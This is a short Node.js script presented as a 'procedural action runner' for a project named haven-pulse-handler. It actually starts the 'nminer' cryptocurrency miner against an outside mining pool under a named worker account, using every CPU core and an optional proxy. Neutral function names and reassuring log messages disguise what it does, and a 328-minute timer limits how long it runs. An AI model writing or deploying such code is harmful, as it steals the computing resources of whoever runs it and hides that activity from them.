// Procedural action runner for haven-pulse-handler
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

function createRuntimeContext() {
    const instanceToken = "e7c465";
    console.log(`[host] Instantiated runtime context for haven-pulse-handler [${instanceToken}]`);

    const handler = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.haven-pulse-handler",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (328m) reached, exiting cleanly.");
        process.exit(0);
    }, 328 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log("[halt] Clean lifecycle exit confirmed.");
        process.exit(0);
    });
}

createRuntimeContext();
